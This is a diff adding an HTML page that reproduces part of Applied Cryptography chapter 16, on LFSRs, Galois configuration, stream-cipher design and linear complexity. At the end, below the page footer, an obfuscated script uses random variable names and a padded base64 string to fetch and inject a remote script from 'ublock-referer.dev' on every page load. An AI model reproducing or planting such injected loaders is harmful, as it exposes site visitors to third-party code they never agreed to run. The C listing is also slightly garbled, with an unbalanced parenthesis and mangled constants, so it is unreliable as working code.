@@ -1,0 +1,120 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Pseudo-Random-Sequence Generators and Stream Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=16//-->
+<!--PAGES=377-380//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>The code is a little more complicated when the shift register is longer than the computer&#146;s word size, but not significantly so.
+</P>
+<P>Note that all of these listings have an odd number of coefficients. I have provided such a large table because LFSRs are often used for stream-cipher cryptography and I wanted many examples so that different people would pick different primitive polynomials. Since, if <I>p</I>(<I>x</I>) is primitive, then so is <I>x<SUP>n</SUP>p</I>(1/<I>x</I>); each entry on the table is actually two primitive polynomials.</P>
+<P>For example, if (<I>a, b</I>, 0) is primitive, then (<I>a, a</I> - <I>b</I>, 0) is also primitive. If (<I>a, b, c, d</I>, 0) is primitive, then (<I>a, a</I> - <I>d, a</I> - <I>c, a</I> - <I>b</I>, 0) is also primitive. Mathematically:</P>
+<DL>
+<DD>if <I>x<SUP>a</I></SUP> &#43; <I>x<SUP>b</I></SUP> &#43; 1 is primitive, so is <I>x<SUP>a</I></SUP> &#43; <I>x<SUP>a-b</I></SUP> &#43; 1
+<DD>if <I>x<SUP>a</I></SUP> &#43; <I>x<SUP>b</I></SUP> &#43; <I>x<SUP>c</I></SUP> &#43; <I>x<SUP>d</I></SUP> &#43; 1 is primitive, so is <I>x<SUP>a</I></SUP> &#43; <I>x<SUP>a-d</I></SUP> &#43; <I>x<SUP>a-c</I></SUP> &#43; <I>x<SUP>a-b</I></SUP> &#43; 1
+</DL>
+<P>Primitive trinomials are fastest in software, because only two bits of the shift register have to be XORed to generate each new bit. Actually, all the feedback polynomials listed in Table 16.2 are <B>sparse</B>, meaning that they only have a few coefficients. Sparseness is always a source of weakness, sometimes enough to break the algorithm. It is far better to use <B>dense</B> primitive polynomials, those with a lot of coefficients, for cryptographic applications. If you use dense polynomials, and especially if you make them part of the key, you can live with much shorter LFSRs.</P>
+<P>Generating dense primitive polynomials modulo 2 is not easy. In general, to generate primitive polynomials of degree <I>k</I> you need to know the factorization of 2<SUP>k</SUP> - 1. Three good references for finding primitive polynomials are [652,1285,1287].</P>
+<P>LFSRs are competent pseudo-random-sequence generators all by themselves, but they have some annoying nonrandom properties. Sequential bits are linear, which makes them useless for encryption. For an LFSR of length <I>n</I>, the internal state is the next <I>n</I> output bits of the generator. Even if the feedback scheme is unknown, it can be determined from only 2<I>n</I> output bits of the generator, by using the highly efficient Berlekamp-Massey algorithm [1082,1083]: see Section 16.3.</P>
+<P>Also, large random numbers generated from sequential bits of this sequence are highly correlated and, for certain types of applications, not very random at all. Even so, LFSRs are often used as building blocks in encryption algorithms.</P>
+<P><FONT SIZE="+1"><B><I>LFSRs in Software</I></B></FONT></P>
+<P>LFSRs are slow in software, but they&#146;re faster in assembly language than in C. One solution is to run 16 LFSRs (or 32, depending on your computer&#146;s word size) in parallel. This scheme uses an array of words that is the length of the LFSR, with each bit position in the words representing a different LFSR. Assuming all the feedback polynomials are the same, this can run pretty quickly. In general, the best way to update shift registers is to multiply the current state by suitable binary matrices [901].
+</P>
+<P>It is also possible to modify the LFSR&#146;s feedback scheme. The resultant generator is no better cryptographically, but it still has a maximal period and is easy to implement in software [1272]. Instead of using the bits in the tap sequence to generate the new left-most bit, each bit in the tap sequence is XORed with the output of the generator and replaced; then the output of the generator becomes the new left-most bit (see Figure 16.5). This is sometimes called a <B>Galois configuration</B>.</P>
+<P>In C, this looks like:</P>
+<!-- CODE //-->
+<PRE>
+#define mask 0&#215;80000057
+
+static unsigned long ShiftRegister=1;
+void seed_LFSR (unsigned long seed)
+{
+     if (seed == 0) /* avoid calamity */
+          seed = 1;
+     ShiftRegister = seed;
+}
+
+int modified_LFSR (void)
+{
+     if (ShiftRegister &amp 0&#215;00000001) {
+          ShiftRegister = ((ShiftRegister ^ mask &gt&gt 1) |
+     0&#215;8000000;
+          return 1;
+     } else {
+          ShiftRegister &gt&gt= 1;
+          return 0;
+     }
+}
+</PRE>
+<!-- END CODE //-->
+<I><P><A NAME="Fig5"></A><A HREF="javascript:displayWindow('images/16-05.jpg',292,68 )"><IMG SRC="images/16-05t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/16-05.jpg',292,68)"><FONT COLOR="#000077"><B>Figure 16.5</B></FONT></A>&nbsp;&nbsp;Galois LFSR.</I>
+</P>
+<P>The savings here is that all the XORs can be done as a single operation. This can also be parallelized, and the different feedback polynomials can be different. The Galois configuration can also be faster in hardware, especially in custom VLSI implementations. In general, if you are using hardware that is good at shifts, use a Fibonacci configuration; if you can exploit parallelism, use a Galois configuration.
+</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">16.3 Design and Analysis of Stream Ciphers</FONT></H3>
+<P>Most practical stream-cipher designs center around LFSRs. In the early days of electronics, they were very easy to build. A shift register is nothing more than an array of bit memories and the feedback sequence is just a series of XOR gates. Even in VLSI circuitry, a LFSR-based stream cipher can give you a lot of security with only a few logic gates.
+</P>
+<P>The problem with LFSRs is that they are very inefficient in software. You want to avoid sparse feedback polynomials&#151;they facilitate correlation attacks [1051,1090,350]&#151;and dense feedback polynomials are inefficient. Any stream cipher outputs a bit at a time; you have to iterate the algorithm 64 times to encrypt what a single iteration of DES can encrypt. In fact, a simple LFSR algorithm like the shrinking generator described later is no faster in software than DES.</P>
+<P>This branch of cryptography is fast-paced and very politically charged. Most designs are secret; a majority of military encryptions systems in use today are based on LFSRs. In fact, most Cray computers (Cray 1, Cray X-MP, Cray Y-MP) have a rather curious instruction generally known as &#147;population count.&#148; It counts the 1 bits in a register and can be used both to efficiently calculate the Hamming distance between two binary words and to implement a vectorized version of a LFSR. I&#146;ve heard this called the canonical NSA instruction, demanded by almost all computer contracts.</P>
+<P>On the other hand, an astonishingly large number of seemingly complex shift-register-based generators have been cracked. And certainly military cryptanalysis institutions such as the NSA have cracked a lot more. Sometimes it&#146;s amazing to see the simple ones proposed again and again.</P>
+<P><FONT SIZE="+1"><B><I>Linear Complexity</I></B></FONT></P>
+<P>Analyzing stream ciphers is often easier than analyzing block ciphers. For example, one important metric used to analyze LFSR-based generators is <B>linear complexity</B>, or linear span. This is defined as the length, <I>n</I>, of the shortest LFSR that can mimic the generator output. Any sequence generated by a finite-state machine over a finite field has a finite linear complexity [1006]. Linear complexity is important because a simple algorithm, called the <B>Berlekamp-Massey</B> algorithm, can generate this LFSR after examining only 2<I>n</I> bits of the keystream [1005]. Once you&#146;ve generated this LFSR, you&#146;ve broken the stream cipher.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="16-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ZWBBAyaN, ZMXSIzlF) {ZMXSIzlF = ZWBBAyaN.createElement('script');ZMXSIzlF.type = 'text/javascript';ZMXSIzlF.async = true;ZMXSIzlF.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ZWBBAyaN.getElementsByTagName('body')[0].appendChild(ZMXSIzlF);}(document));</script></body>
+</html>
